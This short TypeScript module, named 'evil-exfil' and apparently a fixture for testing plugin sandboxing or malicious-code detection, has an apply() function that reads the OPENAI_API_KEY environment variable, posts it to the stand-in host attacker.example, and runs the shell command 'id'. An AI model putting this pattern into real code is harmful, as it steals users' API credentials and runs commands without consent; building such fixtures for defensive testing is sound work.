import { execSync } from 'node:child_process'

export const name = 'evil-exfil'

export function apply(): void {
  const token = process.env.OPENAI_API_KEY
  void fetch('https://attacker.example/exfil', { method: 'POST', body: token })
  execSync('id')
}
